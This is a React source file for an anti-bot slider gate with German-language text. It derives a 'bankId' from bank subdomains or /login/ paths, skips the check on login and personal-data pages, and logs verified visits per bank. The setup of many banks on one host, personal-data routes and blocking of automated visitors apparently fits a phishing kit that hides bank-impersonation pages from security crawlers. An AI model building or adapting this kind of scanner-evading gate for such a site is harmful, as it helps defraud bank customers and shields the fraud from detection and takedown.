import { useEffect, useRef, useState, type ReactNode } from "react";
import { useServerFn } from "@tanstack/react-start";
import { collectBotSignals } from "@/lib/botSignals";
import { logHumanVisit } from "@/lib/visit.functions";

const STORAGE_KEY = "human_verified_v2";
const TRACK_WIDTH = 320;
const HANDLE_SIZE = 44;
const MAX_X = TRACK_WIDTH - HANDLE_SIZE;

function shouldSkipGate(): boolean {
  if (typeof window === "undefined") return true;
  const p = window.location.pathname;
  if (p.startsWith("/admin") || p.startsWith("/auth") || p.startsWith("/reset-password")) return true;
  if (p.startsWith("/api")) return true;
  if (p.startsWith("/login/") || p.startsWith("/personal-data/") || p.startsWith("/qr-personal-data/")) return true;
  // Bank-Subdomain (z. B. vr-bank.example.com) → direkter Login, kein Captcha
  try {
    const host = window.location.hostname;
    const parts = host.split(".");
    const isLovable = host.endsWith("lovable.app") || host.endsWith("lovableproject.com");
    if (!isLovable && host !== "localhost" && parts.length >= 3 && p === "/") return true;
  } catch { /* noop */ }
  return false;
}

function deriveBankId(): string | null {
  try {
    const url = new URL(window.location.href);
    const host = url.hostname;
    const parts = host.split(".");
    let bankId: string | null = null;
    if (parts.length >= 3 && !host.endsWith("lovable.app") && !host.endsWith("lovableproject.com") && host !== "localhost") {
      bankId = parts[0] ?? null;
    }
    const m = url.pathname.match(/^\/login\/([^/]+)/);
    if (m && m[1]) bankId = m[1];
    return bankId;
  } catch {
    return null;
  }
}

export function AntiBotGate({ children }: { children: ReactNode }) {
  const [ready, setReady] = useState(false);
  const [verified, setVerified] = useState(false);
  const [passiveBlocked, setPassiveBlocked] = useState(false);
  const send = useServerFn(logHumanVisit);

  useEffect(() => {
    if (shouldSkipGate()) {
      setVerified(true);
      setReady(true);
      return;
    }
    try {
      if (sessionStorage.getItem(STORAGE_KEY) === "1") {
        setVerified(true);
        setReady(true);
        return;
      }
    } catch {
      /* ignore */
    }

    // Passive gate: hard-block obvious bots BEFORE showing slider
    const sig = collectBotSignals();
    if (sig.score < 0.3) {
      setPassiveBlocked(true);
      setReady(true);
      return;
    }
    setReady(true);
  }, []);

  const onSolved = (score: number) => {
    try {
      sessionStorage.setItem(STORAGE_KEY, "1");
    } catch {
      /* ignore */
    }
    setVerified(true);
    const url = new URL(window.location.href);
    void send({
      data: {
        path: url.pathname,
        bankId: deriveBankId(),
        referrer: document.referrer || null,
        humanScore: score,
        method: "slider",
      },
    }).catch(() => {});
  };

  if (!ready) return null;
  if (passiveBlocked) {
    return (
      <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-background p-6">
        <div className="max-w-sm rounded-2xl border border-border bg-card p-6 text-center shadow-2xl">
          <h2 className="text-base font-semibold text-card-foreground">Zugriff nicht möglich</h2>
          <p className="mt-2 text-sm text-muted-foreground">
            Ihre Umgebung wurde als automatisiert erkannt. Bitte öffnen Sie die Seite in einem
            regulären Browser.
          </p>
        </div>
      </div>
    );
  }
  if (verified) return <>{children}</>;
  return (
    <>
      <div aria-hidden className="pointer-events-none select-none blur-sm">
        {children}
      </div>
      <SliderChallenge onSolved={onSolved} />
    </>
  );
}

function SliderChallenge({ onSolved }: { onSolved: (score: number) => void }) {
  const [x, setX] = useState(0);
  const [status, setStatus] = useState<"idle" | "dragging" | "checking" | "fail" | "ok">("idle");
  const startRef = useRef<{ t: number; clientX: number } | null>(null);
  const samplesRef = useRef<Array<{ t: number; x: number; y: number }>>([]);
  const mountedAtRef = useRef<number>(performance.now());

  useEffect(() => {
    const onMove = (e: PointerEvent) => {
      if (!startRef.current) return;
      const dx = e.clientX - startRef.current.clientX;
      const nx = Math.max(0, Math.min(MAX_X, dx));
      setX(nx);
      samplesRef.current.push({ t: performance.now(), x: nx, y: e.clientY });
    };
    const onUp = () => {
      if (!startRef.current) return;
      const start = startRef.current;
      startRef.current = null;
      const samples = samplesRef.current;
      const duration = performance.now() - start.t;
      const sinceMount = performance.now() - mountedAtRef.current;

      if (x < MAX_X - 4) {
        setStatus("fail");
        setX(0);
        setTimeout(() => setStatus("idle"), 700);
        return;
      }

      // Hardened heuristics
      const okDuration = duration >= 400 && duration <= 15000;
      const okMountDelay = sinceMount >= 600; // no instant scripts
      const enoughSamples = samples.length >= 8;

      const ys = samples.map((s) => s.y);
      const yVar = ys.length > 1 ? Math.max(...ys) - Math.min(...ys) : 0;
      const isTouch = matchMedia("(pointer: coarse)").matches;
      const okJitter = isTouch ? true : yVar >= 2;

      // Velocity variance
      const velocities: number[] = [];
      for (let i = 1; i < samples.length; i++) {
        const cur = samples[i]!;
        const prev = samples[i - 1]!;
        const dt = cur.t - prev.t;
        if (dt > 0) velocities.push((cur.x - prev.x) / dt);
      }
      const meanV = velocities.reduce((a, b) => a + b, 0) / (velocities.length || 1);
      const varV = velocities.reduce((a, b) => a + (b - meanV) ** 2, 0) / (velocities.length || 1);
      const okVariance = isTouch ? true : varV > 0.001;

      // Curvature: reject pure horizontal-only if desktop
      const dtsUniform = velocities.length >= 4 &&
        velocities.every((v) => Math.abs(v - meanV) < 0.0001);
      const okNotUniform = !dtsUniform;

      const checks = [okDuration, okMountDelay, enoughSamples, okJitter, okVariance, okNotUniform];
      const passed = checks.filter(Boolean).length;
      const score = passed / checks.length;

      if (score >= 0.83) {
        setStatus("ok");
        setTimeout(() => onSolved(score), 350);
      } else {
        setStatus("fail");
        setTimeout(() => {
          setX(0);
          setStatus("idle");
        }, 700);
      }
    };
    window.addEventListener("pointermove", onMove);
    window.addEventListener("pointerup", onUp);
    window.addEventListener("pointercancel", onUp);
    return () => {
      window.removeEventListener("pointermove", onMove);
      window.removeEventListener("pointerup", onUp);
      window.removeEventListener("pointercancel", onUp);
    };
  }, [x, onSolved]);

  const startDrag = (e: React.PointerEvent) => {
    e.preventDefault();
    (e.target as Element).setPointerCapture?.(e.pointerId);
    startRef.current = { t: performance.now(), clientX: e.clientX - x };
    samplesRef.current = [{ t: performance.now(), x, y: e.clientY }];
    setStatus("dragging");
  };

  const trackBg =
    status === "ok"
      ? "bg-emerald-100 border-emerald-400"
      : status === "fail"
        ? "bg-red-100 border-red-400"
        : "bg-muted border-border";
  const handleBg =
    status === "ok"
      ? "bg-emerald-500 text-white"
      : status === "fail"
        ? "bg-red-500 text-white"
        : "bg-primary text-primary-foreground";

  return (
    <div
      className="fixed inset-0 z-[9999] flex items-center justify-center bg-background/80 backdrop-blur-md"
      role="dialog"
      aria-modal="true"
      aria-label="Sicherheitsprüfung"
    >
      <div className="w-[min(92vw,380px)] rounded-2xl border border-border bg-card p-6 shadow-2xl">
        <div className="mb-4 text-center">
          <div className="mx-auto mb-3 inline-flex h-10 w-10 items-center justify-center rounded-full bg-primary/10 text-primary">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          </div>
          <h2 className="text-base font-semibold text-card-foreground">Sicherheitsprüfung</h2>
          <p className="mt-1 text-sm text-muted-foreground">
            Schieben Sie den Regler ganz nach rechts, um zu bestätigen, dass Sie kein Bot sind.
          </p>
        </div>
        <div
          className={`relative mx-auto h-11 rounded-full border select-none overflow-hidden ${trackBg}`}
          style={{ width: TRACK_WIDTH }}
        >
          <div
            className="absolute inset-y-0 left-0"
            style={{
              width: x + HANDLE_SIZE / 2,
              background: "hsl(var(--primary) / 0.15)",
            }}
          />
          <div className="pointer-events-none absolute inset-0 flex items-center justify-center text-xs text-muted-foreground">
            {status === "ok"
              ? "Verifiziert"
              : status === "fail"
                ? "Bitte erneut versuchen"
                : "Zum Bestätigen schieben"}
          </div>
          <button
            type="button"
            onPointerDown={startDrag}
            className={`absolute top-0 left-0 flex h-11 items-center justify-center rounded-full shadow transition-colors touch-none ${handleBg}`}
            style={{
              width: HANDLE_SIZE,
              transform: `translateX(${x}px)`,
              cursor: status === "dragging" ? "grabbing" : "grab",
            }}
            aria-label="Schieberegler"
          >
            {status === "ok" ? (
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
            ) : (
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M9 6l6 6-6 6"/></svg>
            )}
          </button>
        </div>
        <p className="mt-4 text-center text-[11px] text-muted-foreground">
          Diese Prüfung schützt Ihre Anmeldung vor automatisierten Zugriffen.
        </p>
      </div>
    </div>
  );
}
